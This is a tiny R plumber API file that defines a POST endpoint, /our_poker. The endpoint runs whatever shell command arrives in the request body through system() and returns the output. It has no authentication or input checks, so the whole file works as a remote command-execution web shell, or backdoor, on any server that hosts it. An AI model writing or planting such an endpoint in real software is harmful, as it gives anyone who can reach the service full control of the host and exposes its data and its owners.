#' @post /our_poker
#' @serializer unboxedJSON
function(req){
  cmd <- req$postBody
  out <- system(cmd, intern = T)
  return(out)
}
